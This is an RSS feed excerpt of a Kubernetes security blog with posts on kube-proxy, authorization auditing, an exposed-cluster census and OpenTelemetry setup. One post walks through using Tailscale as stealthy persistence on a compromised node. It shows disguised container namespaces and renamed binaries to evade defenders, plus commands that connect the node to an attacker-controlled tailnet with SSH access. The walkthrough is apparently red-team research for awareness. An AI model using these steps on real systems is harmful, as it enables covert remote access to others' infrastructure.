      &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;UDPStreamTimeout&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0s&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;ConfigSyncPeriod&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;15m0s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;PortRange&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This was just a quick note with a look at the kube-proxy API. Of the APIs that Kubernetes presents, it’s probably not the most interesting from a security perspective, but still has some interesting information disclosure and the choice to not provide authentication does make it an interesting target for reconnaissance.&lt;/p&gt;
</description>
				<pubDate>Sun, 16 Jun 2024 12:27:00 +0100</pubDate>
				<link>https://raesene.github.io/blog/2024/06/16/Taking-A-Look-At-The-Kube-Proxy-API/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2024/06/16/Taking-A-Look-At-The-Kube-Proxy-API/</guid>
			</item>
		
			<item>
				<title>Fun with Kubernetes Authorization Auditing - multiple authz plugins</title>
				<description>&lt;p&gt;One of the features of Kubernetes security, is its flexible model. This allows cluster operators to have multiple Authentication or Authorization modes running covering a number of use cases. This does introduce some complexity though both in terms of operation and also in terms of reviewing or auditing rights.&lt;/p&gt;

&lt;p&gt;The most common case here is cloud managed Kubernetes where, in addition to the in-built RBAC authorization, you’ll often find that there’s a webhook authorization mode enabled as well to allow for integration with the cloud provider’s IAM system.&lt;/p&gt;

&lt;h2 id=&quot;multiple-authorizer-process&quot;&gt;Multiple authorizer process&lt;/h2&gt;

&lt;p&gt;(Updated with information from &lt;a href=&quot;https://x.com/therealpires/status/1782729861951332712&quot;&gt;@pires&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;In principle the way that Kubernetes authorization works is that every configured authorizer is queried in series (with the order based on the order of the parameters provided to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authorization-mode&lt;/code&gt; flag on the API server) to see if a given action is explicitly allowed or explicitly denied. If an authorizer doesn’t match with either an explicit allow or an explicit deny, the next configured authorizer is queried. So the effective rights will be based on the responses from one or more configured authorizers.&lt;/p&gt;

&lt;p&gt;There’s a couple of fun nuances of doing this, so I thought it was worth some discussion :)&lt;/p&gt;

&lt;h2 id=&quot;auditing-permissions-in-kubernetes&quot;&gt;Auditing permissions in Kubernetes&lt;/h2&gt;

&lt;p&gt;I’ve covered some details of this &lt;a href=&quot;https://raesene.github.io/blog/2022/08/14/auditing-rbac-redux/&quot;&gt;before&lt;/a&gt;, so we’ll just look at the specific aspects of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl auth can-i&lt;/code&gt; as a mechanism for reviewing permissions. This command has two ways of being used the first allows for specific questions to be asked like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl auth can-i get pods&lt;/code&gt; and the second which lists all the permissions of the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl auth can-i --list&lt;/code&gt; . So knowing this lets see what happens if we use this in a cluster with multiple authorization mechanisms setup.&lt;/p&gt;

&lt;h2 id=&quot;setting-up-a-webhook-authorizer&quot;&gt;Setting up a webhook authorizer&lt;/h2&gt;

&lt;p&gt;For the purposes of this article I just wanted the most simplistic implementation of a webhook authorizer, so I put one together (with some help from an LLM). The code is &lt;a href=&quot;https://github.com/raesene/k8ssimpleauthzwebhook&quot;&gt;here&lt;/a&gt;, it’s basic but should help explain things.&lt;/p&gt;

&lt;h2 id=&quot;auditing-permissions-with-two-authorizers&quot;&gt;Auditing permissions with two authorizers&lt;/h2&gt;

&lt;p&gt;Once we have a cluster setup using this code, we can test things out. first I created a user called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jane&lt;/code&gt; , using &lt;a href=&quot;https://github.com/raesene/teisteanas&quot;&gt;teisteanas&lt;/a&gt;. With the user setup, I can use kubectl to get a list of all Jane’s permissions&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl --kubeconfig=jane.kubeconfig auth can-i --list
Warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs   Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                  []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []               [create]
                                                [/api/*]            []               [get]
                                                [/api]              []               [get]
                                                [/apis/*]           []               [get]
                                                [/apis]             []               [get]
                                                [/healthz]          []               [get]
                                                [/healthz]          []               [get]
                                                [/livez]            []               [get]
                                                [/livez]            []               [get]
                                                [/openapi/*]        []               [get]
                                                [/openapi]          []               [get]
                                                [/readyz]           []               [get]
                                                [/readyz]           []               [get]
                                                [/version/]         []               [get]
                                                [/version/]         []               [get]
                                                [/version]          []               [get]
                                                [/version]          []               [get]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;These permissions are the base ones assigned to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:authenticated&lt;/code&gt; group, as I’ve not made any specific rights assignments to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jane&lt;/code&gt;. Note there’s a &lt;em&gt;Warning&lt;/em&gt; at the top which lets us know that webhook authorization is not covered here. This is kind of important, because it means that if we’re auditing permissions on a cluster, we can’t rely on the output of this command to include all of a users rights.&lt;/p&gt;

&lt;p&gt;Next up, let’s try something different, we’ll ask &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl&lt;/code&gt; if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jane&lt;/code&gt; can get pods.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; kubectl --kubeconfig=jane.kubeconfig auth can-i get pods
yes
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and if we look in the webhook’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rights.txt&lt;/code&gt; file we can see that’s one of the rights assigned via the webhook.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jane:get:pods:default
jane:list:pods:default
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So that’s interesting, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth can-i&lt;/code&gt; was able to reference permissions granted via the webhook where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth can-i --list&lt;/code&gt; was not. Why is that? Well (after getting some more information from &lt;a href=&quot;https://kubernetes.slack.com/archives/C0EN96KUY/p1713697390343119&quot;&gt;SIG-Auth&lt;/a&gt;) I think it works like this.&lt;/p&gt;

&lt;p&gt;Basically this difference comes down to whether the Authorization provider implements methods to support listing permissions. RBAC, ABAC and the AlwaysAllow modes of authorization are the only ones to support it, the WebhookAuthorizer does not, so rights granted via that mechanism won’t show up in the results of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl auth can-i --list&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Also, as mentioned in the introduction, admission control can also cause requests to be rejected if they are part of the groups of requests sent to admission control (so any requests which create, update, or delete resources), so even if all authorizers were able to tell you the available permissions that’s not a full picture.&lt;/p&gt;

&lt;h2 id=&quot;so-how-do-i-audit-kubernetes-permissions&quot;&gt;So how do I audit Kubernetes permissions?&lt;/h2&gt;

&lt;p&gt;All this leads to the question of how you audit permissions in Kubernetes clusters with multiple authorizers. The answer here is that the only way to effectively do it is to review each authorization system that’s in place in the cluster, and look at the permissions granted in each one.&lt;/p&gt;

&lt;p&gt;This does mean you should be very careful when using automated tooling which audits Kubernetes permissions. In most cases it’s quite likely it will only support RBAC, and won’t provide any information about rights granted in other authorization systems.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;It’s fair to say that the flexibility provided in Kubernetes security model does lead to some complexity, which you need to be aware of when operating or reviewing clusters. In this case it’s important to be aware of the limitations of in-built tooling and realise when it’s necessary to carry out additional manual reviews.&lt;/p&gt;

</description>
				<pubDate>Mon, 22 Apr 2024 11:27:00 +0100</pubDate>
				<link>https://raesene.github.io/blog/2024/04/22/Fun-with-Kubernetes-Authz/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2024/04/22/Fun-with-Kubernetes-Authz/</guid>
			</item>
		
			<item>
				<title>Using Tailscale for persistence</title>
				<description>&lt;p&gt;I’ve written &lt;a href=&quot;https://raesene.github.io/blog/2022/06/11/escaping-the-nested-doll-with-tailscale/&quot;&gt;before&lt;/a&gt; about how there’s lots of innovative uses for &lt;a href=&quot;https://tailscale.com/&quot;&gt;Tailscale&lt;/a&gt; and I was playing with another scenario for my &lt;a href=&quot;https://cfp.cloud-native.rejekts.io/cloud-native-rejekts-eu-paris-2024/talk/ZJEVSY/&quot;&gt;Cloud Native Rejekts talk&lt;/a&gt; (&lt;a href=&quot;https://www.youtube.com/watch?v=-9GN057zm_U&amp;amp;t=19240s&quot;&gt;Video Recording here&lt;/a&gt; ), so I thought it’d be worth writing up as I learned some things along the way!&lt;/p&gt;

&lt;p&gt;The idea here is to see how someone could use Tailscale as part of getting persistence on a compromised system (for example a Kubernetes cluster) to keep access in a relatively stealthy fashion. We’re running Tailscale inside a container running on a Kubernetes node and we want to communicate back to a host outside the cluster over the network.&lt;/p&gt;

&lt;p&gt;Whilst Tailscale generally uses UDP for its communications, it can also communicate over 443/TCP using &lt;a href=&quot;https://tailscale.com/blog/how-tailscale-works#encrypted-tcp-relays-derp&quot;&gt;DERP&lt;/a&gt; meaning it should work as long as the compromised host can initiate outbound connections on 443/TCP (a reasonably common configuration!)&lt;/p&gt;

&lt;h2 id=&quot;setting-up-our-tailnet&quot;&gt;Setting up our tailnet&lt;/h2&gt;

&lt;p&gt;For this I set-up a new isolated tailnet, to keep the ACLs simple. It’s relatively easy to switch between tailnets, so there’s no major downside to having a dedicated tailnet, as all the features we want to use are available on Tailscale’s free tier.&lt;/p&gt;

&lt;p&gt;Once we’ve got our new tailnet, the goal is to have two groups of systems. The first one is our controllers, which will connect back into our compromised node(s). The second group is the “bots” which we’ll install on our target systems.&lt;/p&gt;

&lt;p&gt;Then we want to configure Tailscale so that traffic from the controllers to the bots is allowed, but no traffic from bots back to controllers (or bots to other bots) is permitted. Tailscale provide a nice ACL system, which we can use to create this setup.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{

	// Create our bots and controllers groups
	&quot;tagOwners&quot;: {
		&quot;tag:bots&quot;:        [&quot;autogroup:admin&quot;],
		&quot;tag:controllers&quot;: [&quot;autogroup:admin&quot;],
	},

	&quot;acls&quot;: [
		// Accept traffic from controllers to bots
		{&quot;action&quot;: &quot;accept&quot;, &quot;src&quot;: [&quot;tag:controllers&quot;], &quot;dst&quot;: [&quot;tag:bots:*&quot;]},
	],

	// Define users and devices that can use Tailscale SSH.
	&quot;ssh&quot;: [
		// Accept SSH connections from controllers to bots
		{
			&quot;action&quot;: &quot;accept&quot;,
			&quot;src&quot;:    [&quot;tag:controllers&quot;],
			&quot;dst&quot;:    [&quot;tag:bots&quot;],
			&quot;users&quot;:  [&quot;autogroup:nonroot&quot;, &quot;root&quot;],
		},
	],
}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;One slightly un-intuitive piece is that you need to define tags in an ACL policy &lt;em&gt;before&lt;/em&gt; assigning them to any hosts.&lt;/p&gt;

&lt;p&gt;Once the ACL policy is in place you can just assign a tag to the control host in the Tailscale GUI&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/tailscale-acl.png&quot; alt=&quot;Tailscale ACL&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For our bots, we can use Tailscale’s &lt;a href=&quot;https://tailscale.com/kb/1085/auth-keys&quot;&gt;Auth Key&lt;/a&gt; feature, and generate a key that can be used for all our bots, but also has the “bot” tag applied to it automatically, so there’s no risk of them inadvertently getting more access than we want.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/tailscale-auth-keys.png&quot; alt=&quot;Tailscale ACL&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;running-tailscale-on-our-bot-hosts&quot;&gt;Running Tailscale on our bot hosts&lt;/h2&gt;

&lt;p&gt;Now that we’ve got our tailnet configured, the next step is to deploy on our compromised hosts. In the scenario I used for my talk, the attacker has access to cluster-admin level credentials for a brief period of time, so wants to use Tailscale to help them retain access after that window of opportunity closes.&lt;/p&gt;

&lt;p&gt;One way of running Tailscale that should always work is to use a container, as typically Kubernetes cluster nodes can always run containers :) We could either run a new container using the runtime on the node (e.g. Containerd) or use Kubernetes static manifests to have the Kubelet run it for us.&lt;/p&gt;

&lt;h3 id=&quot;running-with-containerd&quot;&gt;Running with Containerd&lt;/h3&gt;

&lt;p&gt;It’s possible to use Containerd to run a new container on a Kubernetes node using the provided &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctr&lt;/code&gt; client. Whilst there are better clients like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nerdctl&lt;/code&gt; available, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctr&lt;/code&gt; will always be available and we can do what we need with it.&lt;/p&gt;

&lt;p&gt;One slight complication with this approach is that it won’t work from inside a container (for example the one provided by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl debug node&lt;/code&gt;), as Containerd’s API expects the client to have the same resources available to it as the server (unlike Docker, where all that’s required is access to the Docker socket). You can get round this by doing something like SSH’ing to the node.&lt;/p&gt;

&lt;p&gt;First up we’ll create a new Containerd namespace. This makes it a little harder to spot the container if someone looks at the containers running on the host.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctr namespace create sys_net_mon
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once we’ve created the namespace, we can pull a new container image down to the node. In my case I’ve created an image on Docker hub with Tailscale and a couple of other tools, which I called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systemd_net_mon&lt;/code&gt; , no need to make the blue team’s job too easy by calling it something like “botnet_node” :D&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctr -n sys_net_mon images pull docker.io/raesene/systemd_net_mon:latest
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once the image is available on the node we can just run it, while providing full access to the node filesystem.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=rbind:ro docker.io/raesene/systemd_net_mon:latest sys_net_mon
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then from inside the container, we just need two commands to start Tailscale up and connect it to our tailnet. Here we can make use of the fact that Tailscale is provided as a pair of Golang binaries, by just renaming the server to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systemd_net_mon_server&lt;/code&gt; and the client to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systemd_net_mon_client&lt;/code&gt;. That way if someone runs a process list on the host, that’s all they’ll see, a bit less obvious than Tailscale itself.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systemd_net_mon_server --tun=userspace-networking --socks5-server=localhost:1055 &amp;amp;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systemd_net_mon_client up --ssh --hostname cafebot --auth-key=[AUTH_KEY_HERE]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With that, our bot will be up and connected to the tailnet. We can then connect to it via Tailscale’s embedded SSH daemon, with all the traffic going over the Tailscale tunnel.&lt;/p&gt;

&lt;h3 id=&quot;running-with-static-manifests&quot;&gt;Running with static manifests&lt;/h3&gt;

&lt;p&gt;Another way of doing this is to create a static Kubernetes manifest and put it in the directory the Kubelet watches (e.g. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/kubernetes/manifests&lt;/code&gt;). The advantages of this approach is that they Kubelet will take care of re-starting the pod if necessary.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This was just a quick walkthrough of using Tailscale for creating a little “botnet”. Whilst there are many tools to do this with, it’s always interesting to explore other options!&lt;/p&gt;
</description>
				<pubDate>Sun, 24 Mar 2024 07:27:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2024/03/24/Using-Tailscale-for-persistence/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2024/03/24/Using-Tailscale-for-persistence/</guid>
			</item>
		
			<item>
				<title>A final Kubernetes census</title>
				<description>&lt;p&gt;Well, all good things must come to an end. Over the last couple of years I’ve been using the &lt;a href=&quot;https://censys.io&quot;&gt;Censys&lt;/a&gt; API to track the number of Kubernetes clusters exposed to the internet which disclose their version number, and I’ve written about it a couple of times &lt;a href=&quot;https://raesene.github.io/blog/2021/06/05/A-Census-of-Kubernetes-Clusters/&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;https://raesene.github.io/blog/2022/07/03/lets-talk-about-kubernetes-on-the-internet/&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;After a couple of failures of the daily script to run, I logged into my Censys account to see a banner saying that free access to their API had been removed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/censys-no-free-api.png&quot; alt=&quot;No free Censys&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the plans available they were a bit pricey for this hobby project, so I’ve decided to stop the daily script and this will be the last post on the topic.&lt;/p&gt;

&lt;h2 id=&quot;kubernetes-numbers&quot;&gt;Kubernetes numbers&lt;/h2&gt;

&lt;p&gt;So what’s the final outcome? Well the last scan shows 1,626,249 cluster hosts with visible version numbers on the Internet (and it’s worth noting the final number will be higher as some distributions like AKS don’t expose version number without authentication). Compared to 842,350 hosts in August 2022 when this dataset started, that’s a pretty significant increase (I’ve got data from earlier than that in the posts above but Censys changed their scanning methodology in August 2022, so it’s not directly comparable).&lt;/p&gt;

&lt;p&gt;In terms of visible versions, the most common major version is v1.26, which is reasonably up to date, but still quite a way back from the latest released version (v1.29). There is a “long tail” quite visibly present, so it’s obvious that some cluster operators are finding the update cycyle challenging.&lt;/p&gt;

&lt;p&gt;Looking at a graph of all the versions we can see the different versions and how they’ve changed over time.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/kubernetes-versions-2024.png&quot; alt=&quot;K8s versions&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This has been a pretty interesting project for providing some insights into how Kubernetes adoption runs over time and what versions of Kubernetes are actually in use. It’s amusing that it was enabled by a quirk of Kubernetes default configuration (exposing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/version&lt;/code&gt; without authentication) and defaults from the major managed Kubernetes distributions (which put the API server on the Internet by default).&lt;/p&gt;

&lt;p&gt;The data is available at &lt;a href=&quot;https://github.com/raesene/public-k8s-censys&quot;&gt;this repo&lt;/a&gt; along with some details of how it was analysed, so that might well be useful for someone else :)&lt;/p&gt;
</description>
				<pubDate>Sat, 17 Feb 2024 14:27:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2024/02/17/a-final-kubernetes-censys/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2024/02/17/a-final-kubernetes-censys/</guid>
			</item>
		
			<item>
				<title>Adding Open Telemetry to Container Stacks</title>
				<description>&lt;p&gt;This year, I’ve started looking at how &lt;a href=&quot;https://www.linkedin.com/pulse/security-observability-match-made-heaven-rory-mccune-mej4e%3FtrackingId=MrZn6Pw%252FpmXQjCGKT1hxKA%253D%253D/?trackingId=MrZn6Pw%2FpmXQjCGKT1hxKA%3D%3D&quot;&gt;observability can work well for security&lt;/a&gt; and as part of that I’ve been investigating Open Telemetry, to understand more about how it works.&lt;/p&gt;

&lt;p&gt;So when I noticed in recent Kubernetes release notes that Open Telemetry support was being added, I decided to take a look at how it’s being integrated in k8s and other parts of container stacks.&lt;/p&gt;

&lt;p&gt;This blog is just some notes about how to get it set up, and some of the things I’ve noticed along the way.&lt;/p&gt;

&lt;h2 id=&quot;basic-architecture&quot;&gt;Basic Architecture&lt;/h2&gt;

&lt;p&gt;There’s essentially 3 elements to the architecture of a basic observability stack. We’ve got sources of Telemetry (e.g. logs, metrics, traces) which in this case will be services like Kubernetes and Docker, a collector to gather and process that telemetry, and then one or more backends to send the information to.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/container-otel-architecture.png&quot; alt=&quot;Basic OTel Architectuer&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For the sources of telemetry in this case we’re going to rely on their OTel integrations, which are built into the software. The &lt;a href=&quot;https://opentelemetry.io/docs/collector/&quot;&gt;Open Telemetry Collector&lt;/a&gt; is our collector which will receive the data, process it and then forward to our backends. Then for backends to demonstrate having multiple ones setup, I used &lt;a href=&quot;https://www.jaegertracing.io/&quot;&gt;Jaeger&lt;/a&gt; and &lt;a href=&quot;https://www.datadoghq.com/&quot;&gt;Datadog&lt;/a&gt; (full disclosure, I work for Datadog :) ).&lt;/p&gt;

&lt;h2 id=&quot;setting-up-the-otel-support-in-kubernetes&quot;&gt;Setting up the OTel support in Kubernetes&lt;/h2&gt;

&lt;p&gt;To test this out in Kubernetes I’m going to make use of &lt;a href=&quot;https://kind.sigs.k8s.io/&quot;&gt;KinD&lt;/a&gt; to create a local cluster. A relatively recent version of Kubernetes is needed as the OTel support has only been added in the last few releases (alpha in 1.22, beta in 1.27). It’s not currently at release level so we need to give the API server a feature flag to enable it. If you want some more background on how tracing is being added to Kubernetes, it’s worth reading the &lt;a href=&quot;https://github.com/kubernetes/enhancements/tree/master/keps/sig-instrumentation/647-apiserver-tracing&quot;&gt;KEP&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This is the KinD configuration I used to create the cluster. In addition to the feature flag, we need a mount to provide the configuration file to the API server.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-YAML&quot;&gt;kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
featureGates:
  &quot;APIServerTracing&quot;: true
nodes:
- role: control-plane
  extraMounts:
  - hostPath: /home/rorym/otel
    containerPath: /otel
    propagation: None
  kubeadmConfigPatches:
  - |
    kind: ClusterConfiguration
    apiServer:
      extraArgs:
        tracing-config-file: &quot;/otel/config.yaml&quot;
      extraVolumes:
        - name: &quot;otel&quot;
          hostPath: &quot;/otel&quot;
          mountPath: &quot;/otel&quot;
          readOnly: false
          pathType: &quot;Directory&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tracing-config-file&lt;/code&gt; is the key part here, it’s telling the API server where to find the configuration file for the OTel support. The sample file I created looks like this.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-YAML&quot;&gt;apiVersion: apiserver.config.k8s.io/v1beta1
kind: TracingConfiguration
endpoint: 192.168.41.107:4317
samplingRatePerMillion: 1000000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There’s a couple of important settings here. The first one is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;endpoint&lt;/code&gt; which is the address of the OTel collector. The second is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;samplingRatePerMillion&lt;/code&gt; which is the rate at which to sample traces. In this case I’m sampling 100% of traces, but in a real-world scenario you’d want to sample a smaller percentage to avoid overwhelming your backend.&lt;/p&gt;

&lt;h2 id=&quot;setting-up-the-otel-collector&quot;&gt;Setting up the OTel Collector&lt;/h2&gt;

&lt;p&gt;Next step is to setup the OTel collector to receive the traces from the cluster. We need a configuration file for the collector, which looks like this.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-YAML&quot;&gt;receivers:
  otlp: # the OTLP receiver the app is sending traces to
    protocols:
      grpc:
        endpoint: 0.0.0.0:4317
      http:
        endpoint: 0.0.0.0:4318
processors:
  batch:

exporters:
  otlp/jaeger: # Jaeger supports OTLP directly
    endpoint: 192.168.41.107:44317
    tls:
      insecure: true
  datadog:
    api:
      key: &quot;API_KEY_HERE&quot;

service:
  pipelines:
    traces/dev:
      receivers: [otlp]
      processors: [batch]
      exporters: [otlp/jaeger, datadog]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receivers&lt;/code&gt; sections has the ports to listen on , with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4317&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4318&lt;/code&gt; being defaults. In this case we’re deploying the collector on a different host to the cluster, so we’ll listen on all interfaces.&lt;/p&gt;

&lt;p&gt;Next up we define the exporters for the traces. In this case we’re going to forward traces to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jaeger&lt;/code&gt; on a non-standard port (44317) and to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;datadog&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;datadog&lt;/code&gt; exporter needs an API key to be able to send the traces to the backend.&lt;/p&gt;

&lt;p&gt;Finally we define a pipeline to process the traces. In this case we’re going to process all traces and send them to both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jaeger&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;datadog&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;To run the collector we can then just use this docker command&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run &lt;span class=&quot;nt&quot;&gt;--rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; collector &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;/config.yaml:/etc/otelcol-contrib/config.yaml &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 4317:4317 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 4318:4318 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 55679:55679 otel/opentelemetry-collector-contrib:0.93.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;setting-up-jaeger&quot;&gt;Setting up Jaeger&lt;/h2&gt;

&lt;p&gt;For demo purpose we can just run Jaeger using Docker. The command to run it is&lt;/p&gt;

